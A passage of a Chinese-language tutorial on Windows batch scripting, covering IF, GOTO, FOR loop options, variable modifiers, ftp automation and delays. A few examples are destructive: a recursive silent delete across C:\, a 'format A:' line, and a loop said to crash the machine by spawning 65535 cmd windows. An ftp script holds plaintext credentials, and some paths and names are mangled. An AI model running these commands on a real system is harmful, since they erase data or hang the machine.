Echo 扩充到文件的大小: %~z1
Echo 扩展到驱动器号和路径:%~dp1
Echo 扩展到文件名和扩展名:%~nx1
Echo 扩展到类似 DIR 的输出行:%~ftza1
Echo.
Goto :eof

显示
删除引号: tmp.txt
扩充到路径: e:\wamp64\www\tmp.txt
扩充到一个驱动器号: e:
扩充到一个路径: \wamp64\www\
扩充到一个文件名: tmp
扩充到一个文件扩展名: .txt
扩充的路径指含有短名: e:\wamp64\www\tmp.txt
扩充到文件属性:
扩充到文件的日期/时间:
扩充到文件的大小:
扩展到驱动器号和路径:e:\wamp64\www\
扩展到文件名和扩展名:tmp.txt
扩展到类似 DIR 的输出行:e:\wamp64\www\tmp.txt

删除引号: tmp.txt
扩充到路径: E:\wamp64\www\study\bat\tmp.txt
扩充到一个驱动器号: E:
扩充到一个路径: \wamp64\www\study\bat\
扩充到一个文件名: tmp
扩充到一个文件扩展名: .txt
扩充的路径指含有短名: E:\wamp64\www\study\bat\tmp.txt
扩充到文件属性: --a--------
扩充到文件的日期/时间: 2018/06/12 10:06
扩充到文件的大小: 27
扩展到驱动器号和路径:E:\wamp64\www\study\bat\
扩展到文件名和扩展名:tmp.txt
扩展到类似 DIR 的输出行:--a-------- 2018/06/12 10:06 27 E:\wamp64\www\study\bat\tmp.txt

# 如果不用call,而直接运行%cmdstr%,将显示结果%aa%,而不是123456
set aa=123456
set cmdstr=echo %aa%
call %cmdstr%
pause

【 GOTO 和 : 】
在批处理中允许以":XXX"来构建一个标号,冒号与标号之间不能有空格,然后用GOTO XXX跳转到标号:XXX处,然后执行标号后的命令。
指定跳转到标签,找到标签后程序将处理从下一行开始的命令。
goto语句一般与if配合使用,根据不同的条件来执行不同的命令组
DOS支持最长八位字符的标号,当无法区别两个标号时将跳转至最近的一个标号

语法:
goto label(label是参数,指定所要转向的批处理程序中的行。)

if {%1}=={} goto noparms
if {%2}=={} goto noparms
@Rem check parameters if null show usage
:noparms
echo Usage: monitor.bat ServerIP PortNumber
goto end

标签的名字可以随便起,但最好是有意义的字符串,标号的命名规则与文件名的命名规则相同,前加个冒号用来表示这个字符串是标签,goto命令就是根据这个冒号(:)来寻找下一步跳到到那里
@echo off
:start
set /a var+=1
echo %var%
if %var% leq 3 GOTO start
pause
运行显示:
1
2
3
4

TEST6.BAT文件内容:
@ECHO OFF
IF EXIST C:\AUTOEXEC.BAT GOTO _COPY
GOTO _DONE
:_COPY
COPY C:'AUTOEXEC.BAT D:'
:_DONE

</pre>
</div>

<div id="if">
<h3>IF命令 条件判断语句</h3><pre>
IF [NOT] ERRORLEVEL number command
IF [NOT] string1==string2 command
IF [NOT] EXIST filename command

增强用法
IF [/I] string1 compare-op string2 command  # /I不区分大小写
IF CMDEXTVERSION number command
IF DEFINED variable command

增强用法中还有一些用来判断数字的符号:
EQU - 等于
NEQ - 不等于
LSS - 小于
LEQ - 小于或等于
GTR - 大于
GEQ - 大于或等于

判断某个变量是否已经被赋值,用 if defined str 语句
举例：if defined str (echo 变量str已经被赋值,其值为%str%) else (echo 变量str的值为空)

if语句中的command命令都可以用小括号来使用多条命令的组合,包括else子句,组合命令中可以嵌套使用条件或循环命令。

IF EXIST filename (
    del filename
) ELSE (
    echo filename missing
)
也可写成:
if exist filename (del filename) else (echo filename missing)
但这种写法不适合命令太多或嵌套命令的使用。

%ERRORLEVEL% will expand into a string representation of
the current value of ERRORLEVEL, provided that there is not already
an environment variable with the name ERRORLEVEL, in which case you
will get its value instead.  After running a program, the following
illustrates ERRORLEVEL use:

    goto answer%ERRORLEVEL%
    :answer0
    echo Program had return code 0
    :answer1
    echo Program had return code 1

You can also use numerical comparisons above:

    IF %ERRORLEVEL% LEQ 1 goto okay

%CMDCMDLINE% will expand into the original command line passed to
CMD.EXE prior to any processing by CMD.EXE, provided that there is not
already an environment variable with the name CMDCMDLINE, in which case
you will get its value instead.

%CMDEXTVERSION% will expand into a string representation of the
current value of CMDEXTVERSION, provided that there is not already
an environment variable with the name CMDEXTVERSION, in which case you
will get its value instead.

(1) IF [NOT] ERRORLEVEL number command
IF ERRORLEVEL是用来测试上一个DOS命令的返回值的,返回值必须依照从大到小次序顺序判断,返回的值大于等于指定的值时条件成立
Number的数字取值范围0~255

</pre><textarea>@ECHO OFF
XCOPY C:\AUTOEXEC.BAT D
IF ERRORLEVEL 1 ECHO 文件拷贝失败
IF ERRORLEVEL 0 ECHO 成功拷贝文件

@echo off
dir c:
rem 退出代码为>=1就跳至标题1处执行,>=0就跳至标题0处执行
if errorlevel 1 goto 1
if errorlevel 0 goto 0
rem 上面的两行不可交换位置,否则失败了也显示成功。
:0
echo 命令执行成功！
rem 程序执行完毕跳至标题exit处退出
goto exit
:1
echo 命令执行失败！
rem 程序执行完毕跳至标题exit处退出
goto exit
:exit
pause

# 返回值必须依照从大到小次序顺序判断,因此下面的批处理文件是错误的,无论拷贝是否成功,后面的所有echo内容都将按照编写顺序显示出来:
@ECHO OFF
XCOPY C:'AUTOEXEC.BAT D:'
IF ERRORLEVEL 0 ECHO 成功拷贝文件
IF ERRORLEVEL 1 ECHO 未找到拷贝文件
IF ERRORLEVEL 2 ECHO 用户通过ctrl-c中止拷贝操作
IF ERRORLEVEL 3 ECHO 预置错误阻止文件拷贝操作
IF ERRORLEVEL 4 ECHO 拷贝过程中写盘错误

</textarea><pre>
(2) IF [NOT] string1==string2 command
判断某两个字符串是否相等,用 if "字符串1"=="字符串2" 语句
string1和string2都为字符的数据,区分大小写,条件相等后即执行后面的command
检测当前变量的值做出判断,为了防止字符串中含有空格,可用以下格式
if [NOT] {string1}=={string2} command
if [NOT] [string1]==[string2] command
if [NOT] 'string1'=='string2' command  # IF '%1' == 'A' formAT A:
这种写法实际上将括号或引号当成字符串的一部分了,只要等号左右两边一致就行了,比如下面的写法就不行:
if {string1}==[string2] command

判断某两个数值是否相等,用 if 数值1 equ 数值2 语句
if 1 equ 2 (echo 1等于2) else (echo 1不等于2)

(3) IF [NOT] EXIST filename command
IF EXIST用来测试文件或目录是否存在的,格式为 IF EXIST [路径+文件名] 命令

判断驱动器、文件或文件夹是否存在,用 if exist 语句
例如：if exist c:\xue51com.txt (echo c盘下有xue51com.txt存在) else (echo c盘下不存在xue51com.txt)

</pre><textarea>IF EXIST \AUTOEXEC.BAT TYPE \AUTOEXEC.BAT
IF NOT EXIST \AUTOEXEC.BAT ECHO \AUTOEXEC.BAT does not exist

SET GenFile="G:\Jmeter\apache-jmeter-5.0\report\jtl\***.jtl
if not exist %GenFile% echo not exist
set test = E:\wamp64\www\study\test*
if exist test echo yes

rem 该命令运行结果同上,%1是参数,DOS允许传递9个批参数信息给批处理文件,分别为%1~%9(%0表示test2命令本身) ,这有点象编程中的实参和形参的关系,%1是形参,AUTOEXEC.BAT是实参
IF EXIST \%1 TYPE \%1
IF NOT EXIST \%1 ECHO \%1 does not exist

C:\TEST3.BAT文件内容:
@echo off
IF '%1' == 'A' ECHO XIAO
IF '%2' == 'B' ECHO TIAN
IF '%3' == 'C' ECHO XIN

C:'>TEST3 A B C
屏幕上会显示:
XIAO
TIAN
XIN

# 在这个命令执行过程中,DOS会将一个空字符串指定给参数%3
C:'>TEST3 A B
屏幕上会显示
XIAO
TIAN

</textarea>
</div>

<div id="for">
<h3>for命令</h3><pre>
FOR 参数 %%变量名 IN (相关文件或命令) DO 执行的命令
对一个或一组文件、字符串或命令结果中的每一个对象执行特定命令
在批处理文件中使用FOR命令时指定变量使用%%variable,命令行用%variable。变量名称是区分大小写的,所以%i不同于%I

for命令可以带参数或不带参数,带参数时支持以下参数:/d /l /r /f

基本格式
FOR %%variable IN (set) DO command [command-parameters]
%%variable  指定一个单一字母表示可替换的参数。
(set)       指定一个或一组文件,可以使用通配符。
command     指定对每个文件执行的命令
command-parameters 为特定命令指定参数或命令行开关

command可以用括号来组合:
FOR %variable IN (set) DO(
  Command1
  Command2
  ……
)

# 将当前目录下所有以BAT、TXT、SYS为扩展名的文件内容显示出来(不包括隐藏文件)
FOR %C IN (*.BAT *.TXT *.SYS) DO @TYPE %C
# 显示当前目录下与t*.*相匹配的文件,只显示文件名,不显示路径
for %%i in (t*.*) do echo %%i
# 显示d:/mydocuments/目录下与*.doc相匹配的文件
for %%i in (d:/mydocuments/*.doc) do @echo %%i

(1)、参数/d
FOR /D %%variable IN (set) DO command [command-parameters]
/d参数指定仅对目录而不是文件执行的for命令,这个参数主要用于目录搜索,不会搜索文件,如果集中包含通配符则指定与目录名匹配
如果Set(相关文件或命令)包含通配符(*号表示任意个字符,?号只表示任意一个字符),将对与Set相匹配的每个目录执行指定的Command
/D参数只会搜索指定目录下的目录,不会搜索再下一级的目录

for /d %%i in (*) do @echo %%i      # 把当前目录下所有文件夹名字打印出来
for /d %%i in (c:\*) do echo %%i    # 把C盘根目录下的全部目录名字打印出来,而文件名字一个也不显示
for /d %%i in (c:\???) do echo %%i  # 把当前路径下文件夹的名字只有1-3个字母的打出来
for /d %%i in (c:\window?) do echo %%i  # 显示:windows

(2)、参数/r
FOR /R [[drive:]path] %%variable IN (set) DO command [command-parameters]
递归搜索指定路径及所有子目录中与set相符合的所有文件
如果/R后没有指定目录则使用当前目录,如果集仅为一个单点(.)字符则枚举该目录树。

1、set中的文件名如果含有通配符(？或*)则列举/R参数指定的目录及其下面的所用子目录中与set相符合的所有文件,无相符文件的目录则不列举。
2、如果set中为不含通配符的具体文件名则枚举该目录树(即列举该目录及其下面的所有子目录),并在后面加上具体的文件名,而不管set中的指定文件是否存在,如果只列出文件存在的目录则使用
if exist %%i echo %%i来输出所有存在的文件的绝对路径

for /r %%i in (*.exe) do @echo %%i        # 默认以当前目录为搜索路径,全部的EXE文件都列出来
for /r c:\ %%h in (*.chk) do del /q %%h   # 安静模式删除C盘中所有*.chk的文件(根目录和每个目录的子目录下)

for /r c:\ %i in (1) do @echo %i          # 枚举c:\下的所有目录,并在后面加上1
for /r c:\ %%i in (boot.ini) do echo %%i                  # 搜索C盘下所有目录
for /r c:\ %%i in (boot.ini) do if exist %%i echo %%i     # 只列举C盘下所有boot.ini存在的目录
for /r d:\ %%h in (file1,file2) do if exist %%h echo %%h  # 显示d:盘中所有文件名为file1和file2的列表
for /r . %i in (abc.txt) do @echo. > %i   # echo. > %i相当于创建仅有一空行的文本文件,效果是在当前目录下每个目录及其子目录中建一个空abc.txt

</pre><textarea>for /r E:\wamp64\www\study\php\redis %%i in (send.php) do echo %%i
echo.
echo ****************************
echo.
for /r E:\wamp64\www\study\php\redis %%i in (send.php) do if exist %%i echo %%i
输出:
E:\wamp64\www\study\php\redis\send.php
E:\wamp64\www\study\php\redis\msgsys\send.php
E:\wamp64\www\study\php\redis\msgsys_group\send.php

****************************

E:\wamp64\www\study\php\redis\msgsys\send.php

</textarea><pre>
(3)、参数/L
FOR /L %%variable IN(start,step,end) DO command [command-parameters]
该集表示以增量形式从开始到结束的一个数字序列,可以使用负的Step,(1,1,5)产生序列1 2 3 4 5;(5,-1,1)产生序列(5 4 3 2 1)

for /l %%i in (1,1,5) do @echo %%i     # 打印1 2 3 4 5
for /l %%i in (1,2,10) do @echo %%i    # 输出1,3,5,7,9
for /l %%i in (100,-20,1) do @echo %%i # 输出100,80,60,40,20
for /l %%i in (1,1,5) do start cmd     # 打开5个cmd窗口,改成(1,1,65535)会打开65535个CMD窗口导致死机
for /l %%i in (1,1,5) do md %%i        # 建立名字为1-5的5个文件夹
for /l %%i in (1,1,5) do rd /q %%i     # 删除从1~5共5个文件夹

(4)、参数/F
参数/f使用文件解析来处理命令输出、字符串及文件内容
参数/f将会打开集里的文件,使for命令能处理文本文件的读取和添加删除替换等编辑性的操作
使用迭代变量定义要检查的内容或字符串,并使用各种options选项进一步修改解析方式,使用options令牌选项指定哪些令牌应该作为迭代变量传递,在没有使用令牌选项时/F将只检查第一个令牌。

文件解析过程包括读取命令输出、字符串或文件内容,将其分成独立的文本行以及再将每行解析成零或多个令牌,然后通过设置为令牌的迭代变量值调用for循环,默认/F传递每个文件每一行的第一个空白分隔符号,跳过空行。

格式:
FOR /F ["options"] %%i IN (file) DO command
FOR /F ["options"] %%i IN ("string") DO command
FOR /F ["options"] %%i IN ('command') DO command

如果有usebackq选项:
FOR /F ["options"] %variable IN ("file-set") DO command [command-parameters]
FOR /F ["options"] %variable IN ('string') DO command [command-parameters]
FOR /F ["options"] %variable IN (`command`) DO command [command-parameters]

这个可能是最常用的,也是最强的命令,主要用来处理文件和一些命令的输出结果。
file代表一个或多个文件
string代表字符串
command代表命令

带双引号的字符串"options"可选,包括一或多个指定不同解析选项的关键字
默认options缺省时忽略空行,提取默认分隔符空格和tab键分隔之后的第一段内容给for循环中do后的命令来执行

1、eol=x指定当一行以单个字符x符号开头时就忽略它,默认忽略;开头的行,例如设置为.点号则会忽略点号开始的行,但不再忽略;开头的行,不像delims=的那样可定义多个,只允许定义一个,常用来跳过注释行
2、skip=n是要忽略文件中包括空行的前n行,常用来跳过标题行
3、delims=x指定for每一行的单个字符分隔符,默认的分隔符是空格和tab键,可有多字符组合,被理解为多项单个字符,如要空格符须放最后
4、tokens=x,y,m-n
作用是当通过delims将每一行分为更小的元素时,由它来控制要取哪一个或哪几个,该参数最多只能区分31个字段
指每行的哪个符号被传递到每个迭代的for本身,这会导致额外变量名称的分配
tokens=后的数字号可以不按顺序,但书写的顺序与分配给变量的顺序是对应的,这是赋值,至于之后do命令中用不用是另一回事,即最多只需取哪几段
in前变量代表起始的一个变量名,按tokens中定义的总个数来扩充附加变量名,如总个数为3则%c就附加%d和%e,要是%C就附加%D%E,如果附加变量没有对应的内容则直接输出该变量名
tokens=2
tokens=2,3     # 表示依次取第几个被分隔的字符串段来分别赋给%变量及顺序附加的变量
tokens=2,3,5
tokens=2-3     # 一个范围
tokens=2-10
tokens=*       # 通配符*就是把这一行全部或这一行的剩余部分当作一个元素
tokens=2,*     # 符号字符串中的最后一个字符星号则额外的变量将在最后一个符号解析之后分配并接受行的保留文本
tokens=1,2,5-7 # 取第1,2,5,6,7(依次赋给%c,%d,%e,%f,%g共5个变量)
tokens=1,2,3,* # 1,2,3及3后的所有段(要赋给4个变量)
tokens=1,2,3,* # 1,2,3及3后的所有段(要赋给4个变量)
tokens=1,2,5,7 # 1,2,5,7(要赋给4个变量)
5、usebackq
使用后引号`
未使用参数usebackq时:
file表示文件,但不能含有空格
双引号表示字符串,即"string"
单引号表示执行命令,即'command'
使用参数usebackq时:
file和'file'都表示文件
当文件路径或名称中有空格时就可以用双引号括起来
单引号表示字符串,即'string'
后引号表示命令执行,即`command`

FOR /F "eol= delims==" %%i in (a.txt) do echo %%i
FOR /F "eol= delims=" %%i in (a.txt) do echo %%i
for /f "eol= tokens=*" %%i in (a.txt) do echo %%i
显示a.txt全部内容,包括注释行

</pre>file为文件名,for会依次将file中的文件打开,并在进行到下一个文件之前将每个文件读取到内存,按照每一行分成一个个的元素,忽略空白的行<textarea>a.txt的内容:
第1行第1列 第1行第2列 第1行第3列
第2行第1列 第2行第2列 第2行第3列
第3行第1列 第3行第2列 第3行第3列

显示a.txt中的内容可用type命令,type a.txt
for也可以完成同样的命令:
for %%i in (a.txt) do echo %%i    // 只会显示a.txt这个名字,并不会读取其中的内容。
for /f %%i in (a.txt) do echo %%i // 显示a.txt里面的内容,因为/f的作用会读出a.txt中的内容。
先从括号执行,因为含有参数/f,所以for会先打开a.txt,然后读出a.txt的所有内容作为一个集合,以每一行作为一个元素,集合中只有3个元素,用%%i依次代替每个元素,然后执行do后面的命令
显示的结果是:
第1行第1列
第2行第1列
第3行第1列

for /f默认以每一行通过默认分隔符分隔的第一段作为一个元素,for命令提供了更详细的参数delims和tokens
delims用来告诉for每一行应该拿什么作为分隔符,默认的分隔符是空格和tab键

for /f "delims= " %%i in (a.txt) do echo %%i
显示的结果是:
第1行第1列
第2行第1列
第3行第1列

"delims= "是将每个元素以空格分割,默认只取分割之后的第一段内容,如果想要每一行的第二段内容就要用到tokens,它的作用就是当通过delims将每一行通过指定的分隔符分隔时,由它来控制要提供哪一个或哪几个
for /f "tokens=2 delims= " %%i in (a.txt) do echo %%i
执行结果:
第1行第2列
第2行第2列
第3行第2列

tokens支持通配符*及限定范围,要显示第二列和第三列则换成tokens=2,3或tokens=2-3或tokens=2-10之类的
for /f "tokens=2,3 delims= " %%i in (a.txt) do echo %%i %%j
后面的%%j是因为tokens后面要取每一行的两列,用%%i来替换第二列,用%%j来替换第三列,并且必须是按照英文字母顺序排列的,%%j不能换成%%k
执行结果为:
第1行第2列 第1行第3列
第2行第2列 第2行第3列
第3行第2列 第3行第3列

通配符*就是把这一行全部或这一行的剩余部分当作一个元素了
for /f "tokens=*" %%i in (a.txt) do echo %%i
执行结果为:
第1行第1列 第1行第2列 第1行第3列
第2行第1列 第2行第2列 第2行第3列
第3行第1列 第3行第2列 第3行第3列
for /f "tokens=1,* delims= " %%i in (a.txt) do @echo %%i %j
执行结果为:
第1行第1列 第1行第2列 第1行第3列
第2行第1列 第2行第2列 第2行第3列
第3行第1列 第3行第2列 第3行第3列
for /f "tokens=1,* delims= " %i in (a.txt) do @echo %j
执行结果为:
第1行第2列 第1行第3列
第2行第2列 第2行第3列
第3行第2列 第3行第3列

</textarea><textarea>@echo off
echo 姓名 性别 年龄 等-级>abc.txt
echo 张三 男 36   A-1>>abc.txt
echo 李四 男 29   B-2>>abc.txt
echo 赵六 女 31   A-2>>abc.txt

for /f %c in (d:\abc.txt) do @echo %c
输出:
姓名
张三
李四
赵六

解:
options缺省参数选项时循环中每轮会默认以空格为分隔,在打开的文件中逐行给字符串分段,没给增添附加变量即仅一个变量%c则仅把第一段的字符赋给%c,再执行do后的命令,然后进行循环的下一轮,并且默认忽略空行

for /f "skip=1 tokens=1,4 delims= " %c in (d:\abc.txt) do @echo %c %d
显示为:
张三 A-1
李四 B-2
赵六 A-2

解:
skip=1表示忽略开始1行
delims= 以空格分隔每一行中
tokens=1,4 第1个段赋给%c,第4个段赋给c后的一个变量也就是赋给%d
tokens=1,4仅需两个变量名,起始的是in前的%c则每行中第一段赋给%c,第4段赋给变量%d

>for /f "skip=1 tokens=1,4 delims= " %c in (abc.txt) do @echo %c %e
张三 %e
李四 %e
赵六 %e

>for /f "skip=1 tokens=4,1 delims=- " %c in (d:\abc.txt) do @echo %c %d
张三 A-1
李四 B-2
赵六 A-2

</textarea><pre>
d:\aa.txt内容:
Volume in drive D is MYDA
Volume Serial Number is C35D-8998

Directory of D:tmp

09/25/2001 10:40 AM 11,235 yg0925.txt
11/12/2001 04:29 pM 795 buple.txt
04/11/2002 04:18 AM 2,043 vitn.txt
3File(s) 12,673 bytes
0 Dir(s) 5,020,200,655 bytes free

>for /f "skip=5 tokens=5" %a in (d:\aa.txt) do @echo %a
yg0925.txt
buple.txt
vitn.txt
free

本意想把文件里列出的文件显示出来(当然也可以换成对文件进行其他命令操作)
通过skip=5忽略掉前5行,默认以空格分隔后tokens=5取每行第五段字符就顺利地把文件名赋给变量%a,美中不足最后一行取了个不是文件名的(当然可用其他方法处理这个多余的,只是for/f中没提供忽略最后几行的格式),而倒数第二行则无第五段。
显然例中aa.txt里的内容是某次执行dir命令后的内容,它可用类似命令dir > d:\aa.txt来建立

如果在dir中加入合适的参数/b就可以回避多余的部分,还可加入/ad只显示目录,加入/a-d只显示文件等
那么完全可以直接书写命令放入in后的('命令')中,效果一样
for /f "skip=5 tokens=5 " %a in ('dir') do @echo %a

/F参数输出命令的结果
FOR /F "skip=4 delims=" %i in ('net user') do @echo %i
查看本机全部帐号名字,把扩号内的内容用两个单引号引起来就表示那个当命令执行,FOR会返回命令的每行结果,delims=是为了让空格的行能整行显示出来,不加就只显示空格左边一列

FOR /F "skip=4 tokens=*" %%z IN ('set') DO @echo %%z

命令集需用单引号括起来以表示不是文件集而是命令集,如用双引号括起来则表示是字符串集,本例是为了说明for命令的用法,真正有这种用途也愿意用前面的方法。如果在执行本例后什么也没显示,需要先用集里的命令先执行一次,看它显示的格式,也许需要把tokens=5 改成tokens=4,或许还应当给dir加上参数 /a-d以回避显示出目录。
如果集里是由多个文件组成,那么处理完一个文件后又处理完又去处理另一个文件,每个文件行数不同循环次数(do命令的次数)也将因此不同。
如果集里是由命令产生的,那么必须首先熟悉该命令执行后会产生怎样效果的字符系统才能正确安排后面的do命令

无论in后的集是哪种形式,for/f都最终分解为字符串,按需要是否"忽略几行"(skip=)、"用什么刀来切分"(delims= )、"最多只需取哪几段"(tokens=)将集里形成的字符串,逐行地分段赋给%或%%后的变量及可能顺延扩展出的变量,以执行do后的命令,每一行即为一轮循环

对于带有空格的文件名,需要用双引号将文件名括起来。为了用这种方式来使用双引号,还需要使用usebackq选项,否则双引号会被理解成是用作定义某个要分析的字符串的,换句话说带有usebackq参数时in()里用双引号表示的仍是文件名。

</pre><textarea>@echo off
rem 首先建立临时文件test.txt
echo ;注释行,这是临时文件,用完删除 >test.txt
echo 11段 12段 13段 14段 15段 16段 >>test.txt
echo 21段,22段,23段,24段,25段,26段 >>test.txt
echo 31段-32段-33段-34段-35段-36段 >>test.txt
FOR /F "eol=; tokens=1,3* delims=,- " %%i in (test.txt) do echo %%i %%j %%k
Pause
Del test.txt
输出:
11段 13段 14段 15段 16段
21段 23段 24段,25段,26段
31段 33段 34段-35段-36段
请按任意键继续. . .

eol=; 分号开头的行为注释行
tokens=1,3* 将每行第1段,第3段和剩余字段分别赋予变量%%i,%%j,%%k
delims=,- (减号后有一空格)以逗号、减号和空格为分隔符,空格必须放在最后

</textarea>

<h4>FOR命令中的变量</h4><pre>
FOR的变量全部列出来:
~I   - 删除任何引号('),扩展%I
%~fI - 将 %I 扩展到一个完全合格的路径名
%~dI - 仅将 %I 扩展到一个驱动器号
%~pI - 仅将 %I 扩展到一个路径
%~nI - 仅将 %I 扩展到一个文件名
%~xI - 仅将 %I 扩展到一个文件扩展名
%~sI - 扩展的路径只含有短名
%~aI - 将 %I 扩展到文件的文件属性
%~tI - 将 %I 扩展到文件的日期/时间
%~zI - 将 %I 扩展到文件的大小
%~$PATH:I - 查找列在路径环境变量的目录,并将%I扩展到找到的第一个完全合格的名称。如果环境变量名未被定义,或者没有找到文件,此组合键会扩展到空字符串

可以组合修定符来取得多重结果:
%~dpI   - 只将%1扩展到驱动器号和路径
%~nxI   - 只将%1扩展到文件名和扩展名
%~dp$PATH:I - 在列在PATH环境变量中的目录里查找%1,并扩展到找到的第一个文件的驱动器号和路径。
%~ftzaI - 将%1扩展到类似DIR的输出行。

每行都有一个大写字母'I',这个I其实就是在FOR带入的变量,FOR语句代入的变量名是什么,这里就写什么
FOR /F %%z IN ('set') DO @echo %%z
这里代入的变量名是z,就要把那个I改成z,例如%~fI改为%~fz

一、 ~I - 删除任何引号('),扩展%I
删除引号规则如下
1、若字符串首尾同时存在引号则删除首尾的引号;
2、若字符串尾不存在引号则删除字符串首的引号;
3、如果字符串中间存在引号,或只在尾部存在引号,则不删除。
无头不删,有头连尾删。

</pre><textarea>@echo off
echo ^'1111>temp.txt
echo '2222'>>temp.txt
echo 3333^'>>temp.txt
echo '4444'44>>temp.txt
echo ^'55'55'55>>temp.txt
rem 上面建立临时文件,注意不成对的引号要加转义字符^,重定向符号前不要留空格
FOR /F "delims=" %%i IN (temp.txt) DO echo %%~i
pause
del temp.txt
执行结果:
1111  #字符串前的引号被删除了
2222  #字符串首尾的引号都被删除了
3333' #字符串前无引号,后面的引号保留
4444'44 #字符串前面的引号删除了,而中间的引号保留
55'55'55 #字符串前面的引号删除了,而中间的引号保留
请按任意键继续. . .

</textarea>二、 %~fI - 将%I扩展到一个完全合格的绝对路径名<textarea>C:\Users\lenovo\Desktop>dir
 Volume in drive C is Windows
 Volume Serial Number is 8C75-EB17

 Directory of C:\Users\lenovo\Desktop

2019/11/22  01:16    < DIR>          .
2019/11/22  01:16    < DIR>          ..
2018/09/15  16:54             1,045 360安全浏览器.lnk
2019/11/22  00:47               153 a.txt
2019/01/20  22:56    < DIR>          pic
2019/02/21  22:53               855 酷狗音乐.lnk
               8 File(s)         14,975 bytes
               5 Dir(s)  34,782,670,848 bytes free

C:\Users\lenovo\Desktop>FOR /F "skip=7 tokens=4 delims= " %i IN ('dir') DO @echo %i
360安全浏览器.lnk
a.txt
pic
酷狗音乐.lnk
bytes
bytes

C:\Users\lenovo\Desktop>FOR /F "skip=7 tokens=4 delims= " %i IN ('dir') DO @echo %~fi
C:\Users\lenovo\Desktop\360安全浏览器.lnk
C:\Users\lenovo\Desktop\a.txt
C:\Users\lenovo\Desktop\pic
C:\Users\lenovo\Desktop\酷狗音乐.lnk
C:\Users\lenovo\Desktop\bytes
C:\Users\lenovo\Desktop\bytes

</textarea><pre>
三、 %~dI - 仅将%I扩展到一个驱动器号,如果变量%%i的内容是一个文件或目录名就把这文件或目录所在的盘符号打印出来
FOR /F "skip=7 tokens=4 delims= " %i IN ('dir') DO @echo %~di
C:
C:

四、 %~pI - 仅将%I扩展到一个路径,只打印路径不打印盘符和文件名字
FOR /F "delims==" %i IN ('dir /b') DO @echo %~pi
\Users\lenovo\Desktop\
\Users\lenovo\Desktop\

五、 %~nI - 仅将%I扩展到一个文件名,只打印文件名字
FOR /F "delims==" %%i IN ('dir /b') DO @echo %%~ni
360安全浏览器
a

六、 %~xI - 仅将%I扩展到一个文件扩展名,只打印文件的扩展名
FOR /F "delims==" %%i IN ('dir /b') DO @echo %%~xi
.lnk
.txt

七、 %~sI - 扩展的路径只含有短名,打印绝对短文件名
FOR /F "delims==" %%i IN ('dir /b') DO @echo %%~si
C:\Users\lenovo\Desktop\360安~1.LNK
C:\Users\lenovo\Desktop\a.txt

八、 %~aI - 将%I扩展到文件的文件属性,打印文件的属性
FOR /F "delims==" %%i IN ('dir /b') DO @echo %%~ai
d----------
--a--------

九、 %~tI - 将%I扩展到文件的日期/时间,打印文件建立的日期
FOR /F "delims==" %%i IN ('dir /b') DO @echo %%~ti
2016/11/02 17:52
2018/09/15 16:54

十、 %~zI - 将%I扩展到文件的大小,打印文件的大小
FOR /F "delims==" %%i IN ('dir /b') DO @echo %%~zi
153
0

十一、 %~$PATH:I - 查找列在路径环境变量的目录,并将%I扩展到找到的第一个完全合格的名称。如果环境变量名未被定义,或者没有找到文件,此组合键会扩展到空字符串

在PATH变量里指定的路径里搜索notepad.exe文件,如果有notepad.exe则会把他所在绝对路径打印出来,没有就打印一个错误
notepad.exe字符串必须是正确完整的文件名,不能含通配符
>FOR /F "delims=" %i IN ("notepad.exe") DO @echo %~$PATH:i
C:\Windows\System32\notepad.exe
>FOR /F "delims=" %i IN ("otepad.exe") DO @echo %~$PATH:i
ECHO is on.

</pre>

<h4>条件循环</h4><pre>
for命令循环有一个缺点:整个循环被当作一条命令语句,涉及到变量延迟的问题。
dos可以利用goto语句和if条件判断实现条件循环

The /A switch specifies that the string to the right of the equal sign
is a numerical expression that is evaluated.  The expression evaluator
is pretty simple and supports the following operations, in decreasing
order of precedence:

@echo off
set var=0
rem ************循环开始了
:continue
set /a var+=1
echo 第%var%次循环
if %var% lss 100 goto continue
rem ************循环结束了
echo 循环执行完毕
pause

@echo off
set var=100
rem ************循环开始了
:continue
echo 第%var%次循环
set /a var-=1
if %var% gtr 0 goto continue
rem ************循环结束了
echo 循环执行完毕
pause

</pre>
</div>

<div id="useage">
<h4>将批处理转化为可执行文件</h4><pre>
由于批处理文件是一种文本文件,任何人都可以对其进行随便编辑,不小心就会把里面的命令破坏掉,所以如果将其转换成.com格式的可执行文件,不仅执行效率会大大提高,而且不会破坏原来的功能,更能将优先级提到最高。Bat2Com就可以完成这个转换工作。

在DOS环境下可执行文件的优先级由高到低依次为.com>.exe>.bat>.cmd,如果在同一目录下存在文件名相同的这四类文件,当只键入文件名时DOS执行的是name.com,如果需要执行其他三个文件则必须指定文件的全名如name.bat

Bat2Com是一个只有5.43K大小的免费绿色工具,可以运行在DOS命令行中,用法:Bat2Com
FileName,这样就会在同一目录下生成一个名为FileNme.com的可执行文件,执行的效果和原来的.bat文件一样。

</pre>

<h4>用ftp命令实现自动下载</h4><pre>
ftp是常用的下载工具,ftp界面中有40多个常用命令,可用dos命令行调用ftp命令实现ftp自动登录、上传下载、自动退出ftp程序。
其实可以将ftp命令组合保存为一个文本文件,然后用以下命令调用即可。

ftp  -n -s:[[drive:]path]filename

上面的filename为ftp命令文件,包括登录IP地址,用户名、密码、操作命令等
open 90.52.8.3   ＃打开ip
user iware       ＃用户为iware
password8848     ＃密码
bin              ＃二进制传输模式
prompt
cd tmp1          ＃切换至iware用户下的tmp1目录
pwd
lcd d:\download  ＃本地目录
mget *           ＃下载tmp1目录下的所有文件
bye              ＃退出ftp

</pre>

<h4>时间延迟</h4><pre>
时间延迟就是执行一条命令后延迟一段时间再进行下一条命令,应用:模拟进度条

1、利用ping命令延时,发送3次请求到本机的ip(127.0.0.1)。127.0.0.1可简写为127.1,>nul就是屏蔽掉ping命令所显示的内容
@echo off
echo 延时前:%time%
ping /n 3 127.0.0.1 >nul
echo 延时后:%time%
pause

2、利用for命令延时,利用一个计次循环并屏蔽它所显示的内容来达到延时的目的
@echo off
echo 延时前:%time%
for /l %%i in (1,1,5000) do echo %%i>nul
echo 延时后:%time%
pause

3、利用vbs延迟函数,精确度毫秒,误差1000毫秒内
下面运行结果显示实际延时了5500毫秒,多出来的500毫秒时建立和删除临时文件所耗费的时间,误差在一秒之内。
@echo off
echo %time%
call :delay 5000
echo %time%
pause
exit

:delay
echo W******.Sleep %1>delay.vbs
C****** //B delay.vbs
del delay.vbs
goto :eof

4、仅用批处理命令实现任意时间延迟,精确度10毫秒,误差50毫秒内
@echo off
set /p delay=请输入需延迟的毫秒数:
set TotalTime=0
set NowTime=%time%
::读取起始时间,时间格式为:13:01:05.95
echo 程序开始时间:%NowTime%
:delay_continue
